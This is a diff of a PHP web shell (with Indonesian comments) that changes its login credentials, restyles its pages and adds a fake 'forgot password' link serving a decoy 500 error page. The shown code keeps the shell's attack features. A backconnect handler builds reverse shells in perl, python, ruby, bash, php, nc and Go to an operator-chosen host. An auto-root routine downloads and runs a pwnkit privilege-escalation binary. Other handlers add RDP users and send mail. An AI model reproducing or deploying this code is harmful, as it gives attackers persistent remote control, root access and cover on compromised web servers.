@@ -8,10 +8,10 @@ $default_use_ajax = true;
 $default_charset = 'UTF-8';
 
 // Konfigurasi password hash
-$stored_hashed_password = '$2a$12$uNJpbCb2EVGvoxtrwmNHk.6KNJO8UW3IERZ2HvIuTzH0gibNQnT1i'; // Gantilah ini dengan hash yang sesuai
+$stored_hashed_password = '$2a$12$U6XzkKgz7X3Wv8BO0kq0nu2ouA5R23Ckql.rqczR/6Jp58FQPhMiS'; // qweqew
 
 // Username dan password yang benar
-$correct_username = 'Tama1337@@!!##';
+$correct_username = 'Akagami768!!@@##$$##@@!!';
 
 // Fungsi untuk menampilkan halaman login
 function show_login_page() {
@@ -23,44 +23,92 @@ function show_login_page() {
     <style>
         body {
             margin: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #6e7dff, #2d67f0);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            color: #fff;
         }
+
         .container {
             text-align: center;
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 40px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
         }
+
         .login-title {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
+            font-size: 32px;
+            margin-bottom: 30px;
+            font-weight: bold;
+            color: #fff;
+            letter-spacing: 1px;
         }
+
         form {
-            border: 1px solid #ddd;
+            border: none;
             padding: 20px;
-            background-color: #fff;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            display: inline-block;
+            background-color: transparent;
         }
+
         input[type="text"], input[type="password"] {
-            width: calc(100% - 22px);
-            padding: 10px;
+            width: 100%;
+            padding: 12px 15px;
             margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
             box-sizing: border-box;
+            font-size: 16px;
+            background-color: #fff;
+            color: #333;
+            transition: all 0.3s ease;
         }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            border: 1px solid #2d67f0;
+            outline: none;
+        }
+
         input[type="submit"] {
-            padding: 10px 20px;
-            background-color: #007BFF;
+            width: 100%;
+            padding: 12px 0;
+            background-color: #2d67f0;
             border: none;
             color: white;
             cursor: pointer;
-            box-sizing: border-box;
+            font-size: 18px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
         }
+
         input[type="submit"]:hover {
-            background-color: #0056b3;
+            background-color: #1a50b8;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 15px;
+            color: #ccc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            color: #fff;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px;
+            }
+
+            .login-title {
+                font-size: 28px;
+            }
         }
     </style>
 </head>
@@ -70,7 +118,8 @@ function show_login_page() {
         <form method="post">
             <input type="text" name="username" placeholder="Enter username" required>
             <input type="password" name="pass" placeholder="Enter password" required>
-            <input type="submit" value="Submit">
+            <input type="submit" value="Login">
+            <a href="?forgot_password=true" class="forgot-password">Forgot Password?</a>
         </form>
     </div>
 </body>
@@ -84,6 +133,62 @@ if (isset($_GET['d']) && $_GET['d'] === 'logout') {
     session_unset();
     session_destroy();
     header("Location: " . $_SERVER['PHP_SELF']); // Redirect ke halaman login
+    exit();
+}
+
+// Handle forgot password request and trigger 500 error
+if (isset($_GET['forgot_password']) && $_GET['forgot_password'] === 'true') {
+    // Trigger a 500 error with a custom styled page
+    http_response_code(500);
+    echo '<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>500 Internal Server Error</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .error-container {
+            text-align: center;
+            padding: 40px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 60%;
+            max-width: 600px;
+        }
+        .error-title {
+            font-size: 48px;
+            font-weight: bold;
+            color: #e74c3c;
+        }
+        .error-message {
+            font-size: 24px;
+            color: #555;
+            margin-top: 20px;
+        }
+        .error-footer {
+            margin-top: 40px;
+            font-size: 16px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="error-container">
+        <div class="error-title">500 Internal Server Error</div>
+        <div class="error-message">Something went wrong. Please try again later.</div>
+        <div class="error-footer">If the problem persists, contact support.</div>
+    </div>
+</body>
+</html>';
     exit();
 }
 
@@ -101,6 +206,9 @@ if (!isset($_SESSION['authenticated'])) {
         show_login_page();
     }
 }
+
+
+
 
 // Kode PHP tambahan
 @set_time_limit(0);
@@ -164,15 +272,15 @@ function file_ext($file)
 {
     if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
         return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
-    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
+    } elseif (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
         return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
-    } else if (mime_content_type($file) == 'text/javascript') {
+    } elseif (mime_content_type($file) == 'text/javascript') {
         return '<i class="fa-brands fa-square-js"></i>';
-    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
+    } elseif (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
         return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
-    } else if (mime_content_type($file) == 'text/plain') {
+    } elseif (mime_content_type($file) == 'text/plain') {
         return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
-    } else if (mime_content_type($file) == 'application/pdf') {
+    } elseif (mime_content_type($file) == 'application/pdf') {
         return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
     } else {
         return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
@@ -216,7 +324,7 @@ if ($_GET['don'] == true) {
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
@@ -255,7 +363,7 @@ if ($_GET['don'] == true) {
         .btn-submit,
         .form-file,
         tbody tr:nth-child(2n) {
-            background-color: transparent;
+            background-color: #000;
         }
 
         .code-editor,
@@ -705,6 +813,40 @@ if ($_GET['don'] == true) {
             z-index: -1;
             bottom: 0
         }
+
+        table tr {
+            background-color: transparent;
+            transition: background-color 0.3s ease;
+        }
+
+        table tr:hover {
+    background-color: rgba(66, 1, 1, 0.7); /* #420101 with 70% opacity */
+    color: #fff;
+}
+
+
+        .scrollable-box {
+            max-height: 200px; /* Adjust height as needed */
+            overflow-y: scroll;
+            border: 1px solid #ccc;
+            padding: 10px;
+            background-color: #000; /* Black background */
+            color: #fff; /* White text */
+        }
+
+        .scrollable-option {
+            display: block;
+            padding: 5px 0;
+        }
+
+        .scrollable-option input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        .result-link {
+            color: #fff; /* Adjusted to a lighter shade of blue for better visibility on black background */
+            text-decoration: underline;
+        }
     </style>
 </head>
 
@@ -829,7 +971,7 @@ if ($_GET['don'] == true) {
             <td>[ DIR ]</td>
 
             <!-- Directory Permissions -->
-            <td>
+            <td style="text-align: center;">
                 <?php
                 $dirPath = $fungsi[0]() . '/' . $_D;
                 if ($fungsi[4]($dirPath)) {
@@ -841,7 +983,7 @@ if ($_GET['don'] == true) {
                 ?>
                                 </td>
                                 <!-- Action Folder Manager -->
-                                <td>
+                                <td style="text-align: center;">
     <!-- Link for renaming with current file path and identifier -->
     <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor">
         <i class="fa-solid fa-pen-to-square"></i>
@@ -890,7 +1032,7 @@ if ($_GET['don'] == true) {
             <td><?= formatSize(filesize($_F)); ?></td>
 
             <!-- File Permissions -->
-            <td>
+            <td style="text-align: center;">
                 <?php
                 $filePath = $fungsi[0]() . '/' . $_F;
                 if (is_writable($filePath)) {
@@ -902,7 +1044,7 @@ if ($_GET['don'] == true) {
                 ?>
                                 </td>
                                 <!-- Action File Manager -->
-<td>
+    <td style="text-align: center;">
     <!-- Link for renaming the file -->
     <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor">
         <i class="fa-solid fa-pen-to-square"></i>
@@ -948,7 +1090,7 @@ if ($_GET['don'] == true) {
                         <div id="modal-body-bc"></div>
                         <span id="modal-input"></span>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                 </form>
             </div>
@@ -1075,7 +1217,7 @@ if ($_GET['don'] == true) {
                     <form action="" method="post">
                         <textarea name="code-editor" id="code" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                         <div class="modal-btn-form">
-                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
+                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                     </form>
                 </div>
@@ -1088,7 +1230,7 @@ if ($_GET['don'] == true) {
                 <div class="terminal-head">
                     <ul>
                         <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
-                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                        <li><a href="?d=<?= hx($fungsi[0]()) ?>" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                     </ul>
                 </div>
                 <div class="terminal-body">
@@ -1113,7 +1255,7 @@ if ($_GET['don'] == true) {
                 <div class="terminal-head">
                     <ul>
                         <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
-                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
+                        <li><a href="?d=<?= hx($fungsi[0]()) ?>" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                     </ul>
                 </div>
                 <div class="terminal-body">
@@ -1524,31 +1666,6 @@ if ($_GET['don'] == true) {
         </div>
     </div>
 
-    <style>
-.scrollable-box {
-    max-height: 200px; /* Adjust height as needed */
-    overflow-y: scroll;
-    border: 1px solid #ccc;
-    padding: 10px;
-    background-color: #000; /* Black background */
-    color: #fff; /* White text */
-}
-
-.scrollable-option {
-    display: block;
-    padding: 5px 0;
-}
-
-.scrollable-option input[type="checkbox"] {
-    margin-right: 10px;
-}
-
-.result-link {
-    color: #fff; /* Adjusted to a lighter shade of blue for better visibility on black background */
-    text-decoration: underline;
-}
-
-    </style>
 <?php endif; ?>
 
     <?php if ($_GET['re'] == true) : ?>
@@ -1561,7 +1678,7 @@ if ($_GET['don'] == true) {
                     <form action="" method="post">
                         <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                     </form>
                 </div>
@@ -1581,7 +1698,7 @@ if ($_GET['don'] == true) {
                     <input type="text" name="touchFile" class="modal-create-input" placeholder="Date and Time (YYYY-MM-DD HH:MM:SS)">
                 </span>
                 <div class="modal-btn-form">
-                    <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                    <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                 </div>
             </form>
         </div>
@@ -1599,7 +1716,7 @@ if ($_GET['don'] == true) {
                     <form action="" method="post">
                         <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
                         <div class="modal-btn-form">
-                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
+                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                         </div>
                     </form>
                 </div>
@@ -1642,25 +1759,6 @@ if ($_GET['don'] == true) {
                 $('#modal-input').html('<input type="text" name="add-rdp" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-rdp-pass" class="modal-create-input" placeholder="Password">');
                 event.preventDefault();
             });
-
-            $('#close-modal').click(function() {
-                $('.modal').hide();
-                event.preventDefault();
-            });
-            $('#close-editor').click(function() {
-                $('.code-editor').hide();
-                event.preventDefault();
-            });
-
-            $('.close-terminal').click(function() {
-                $('.terminal').hide();
-                event.preventDefault();
-            });
-            $('.close-btn-s').click(function() {
-                $('.modal').hide();
-                event.preventDefault();
-            });
-
 
             var myTextarea = document.getElementById("code");
 
@@ -1743,21 +1841,21 @@ if (isset($_POST['submit-bc'])) {
     $PortServer = $_POST['backconnect-port'];
     if ($_POST['NMN-bc'] == "perl") {
         echo cmd('perl -e \'use Socket;$i="' . $HostServer . '";$p=' . $PortServer . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");' . $fungsi[16] . '("/bin/sh -i");};\'');
-    } else if ($_POST['NMN-bc'] == "python") {
+    } elseif ($_POST['NMN-bc'] == "python") {
         echo cmd('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' . $HostServer . '",' . $PortServer . '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
-    } else if ($_POST['NMN-bc'] == "ruby") {
+    } elseif ($_POST['NMN-bc'] == "ruby") {
         echo cmd('ruby -rsocket -e\'f=TCPSocket.open("' . $HostServer . '",' . $PortServer . ').to_i;' . $fungsi[16] . ' sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'');
-    } else if ($_POST['NMN-bc'] == "bash") {
+    } elseif ($_POST['NMN-bc'] == "bash") {
         echo cmd('bash -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
-    } else if ($_POST['NMN-bc'] == "php") {
+    } elseif ($_POST['NMN-bc'] == "php") {
         echo cmd('php -r \'$sock=fsockopen("' . $HostServer . '",' . $PortServer . ');' . $fungsi[16] . '("/bin/sh -i <&3 >&3 2>&3");\'');
-    } else if ($_POST['NMN-bc'] == "nc") {
+    } elseif ($_POST['NMN-bc'] == "nc") {
         echo cmd('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' . $HostServer . ' ' . $PortServer . ' >/tmp/f');
-    } else if ($_POST['NMN-bc'] == "sh") {
+    } elseif ($_POST['NMN-bc'] == "sh") {
         echo cmd('sh -i >& /dev/tcp/' . $HostServer . '/' . $PortServer . ' 0>&1');
-    } else if ($_POST['NMN-bc'] == "xterm") {
+    } elseif ($_POST['NMN-bc'] == "xterm") {
         echo cmd('xterm -display ' . $HostServer . ':' . $PortServer);
-    } else if ($_POST['NMN-bc'] == "golang") {
+    } elseif ($_POST['NMN-bc'] == "golang") {
         echo cmd('echo \'package main;import"os/' . $fungsi[16] . '";import"net";func main(){c,_:=net.Dial("tcp","' . $HostServer . ':' . $PortServer . '");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go');
     }
 }
@@ -1899,14 +1997,14 @@ if (isset($_POST['submit-action'])) {
                 $rmfile = $fungsi[24]($fd);
                 if ($rmdir || $rmfile) {
                     success();
-                } else if ($rmdir && $rmfile) {
+                } elseif ($rmdir && $rmfile) {
                     success();
                 } else {
                     failed();
                 }
             }
         }
-    } else if ($_POST['NMN-select'] == 'unzip') {
+    } elseif ($_POST['NMN-select'] == 'unzip') {
         foreach ($items as $it) {
             $repl = str_replace("\\","/", $fungsi[0]()); // Untuk Windows Path
             $fd = $repl . "/" . $it;
@@ -1916,7 +2014,7 @@ if (isset($_POST['submit-action'])) {
                 failed();
             }
         }
-    } else if ($_POST['NMN-select'] == 'zip') {
+    } elseif ($_POST['NMN-select'] == 'zip') {
         foreach ($items as $it) {
             $repl = str_replace("\\","/", $fungsi[0]()); // Untuk Windows Path
             $fd = $repl . "/" . $it;
@@ -1942,48 +2040,54 @@ if (isset($_POST['submit'])) {
             failed();
         }
     }
-    if ($_POST['create_folder'] == true) {
+    if ($_POST['create_folder'] === true) {
         $NamaFolder = $fungsi[12]($_POST['create_folder']);
         if ($NamaFolder) {
             success();
         } else {
             failed();
         }
-    } else if ($_POST['create_file'] == true) {
+    } elseif ($_POST['create_file'] == true) {
         $namaFile = $fungsi[13]($_POST['create_file']);
         if ($namaFile) {
             success();
         } else {
             failed();
         }
-    } else if ($_POST['renameFile'] == true) {
+    } elseif ($_POST['renameFile'] == true) {
         $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
         if ($renameFile) {
             success();
         } else {
             failed();
         }
-    } else if ($_POST['touchFile'] == true) {
-        $touchFile = $fungsi[13](unx($_GET['touch']), $_POST['touchFile']);
-        if ($touchFile) {
-            success();
+    } elseif ($_POST['touchFile'] == true) {
+        $newdate = strtotime($_POST['touchFile']);
+        $filePath = unx($_GET['touch']);
+        if ($newdate !== false) {
+            $touchFiles = $fungsi[13]($filePath, $newdate);
+            if ($touchFiles){
+                success();
+            } else { 
+                failed();
+            }
         } else {
             failed();
         }
-    } else if ($_POST['chFile']) {
+    } elseif ($_POST['chFile']) {
         $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
         if ($chFiles) {
             success();
         } else {
             failed();
         }
-    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
+    } elseif (isset($_POST['add-username']) && isset($_POST['add-password'])) {
         if (!$fungsi[3]('pwnkit')) {
             cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
             cmd('chmod +x pwnkit');
             cmd('./pwnkit "id" > .mad-root');
             echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
-        } else if ($fungsi[3]('.mad-root')) {
+        } elseif ($fungsi[3]('.mad-root')) {
             $response = $fungsi[11]('.mad-root');
             $r_text = explode(" ", $response);
             if ($r_text[0] == "uid=0(root)") {
@@ -1994,7 +2098,7 @@ if (isset($_POST['submit'])) {
                 echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
             }
         }
-    } else if ($_POST['lockfile'] == true) {
+    } elseif ($_POST['lockfile'] == true) {
         $flesName = $_POST['lockfile'];
         $TmpNames = $fungsi[31]();
         if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
@@ -2034,7 +2138,7 @@ function NMN_perm($flename){
         } else {
             failed();
         }
-    } else if ($_POST['add-rdp'] == True) {
+    } elseif ($_POST['add-rdp'] == True) {
         $userRDP = $_POST['add-rdp'];
         $passRDP = $_POST['add-rdp-pass'];
         if (stristr(PHP_OS, "WIN")) {
@@ -2048,7 +2152,7 @@ function NMN_perm($flename){
         } else {
             failed();
         }
-    } else if ($_POST['mail-from-smtp'] == True) {
+    } elseif ($_POST['mail-from-smtp'] == True) {
         $emailFrom = $_POST['mail-from-smtp'];
         $emailTo = $_POST['mail-to-smtp'];
         $emailSubject = $_POST['mailto-subject'];
@@ -2073,7 +2177,7 @@ Swal.fire({
     text: 'Done Success!',
     confirmButtonColor: '#22242d',
 })</script>";
-} else if ($_GET['response'] == "failed") {
+} elseif ($_GET['response'] == "failed") {
     echo "<script>
 Swal.fire({
     icon: 'error',
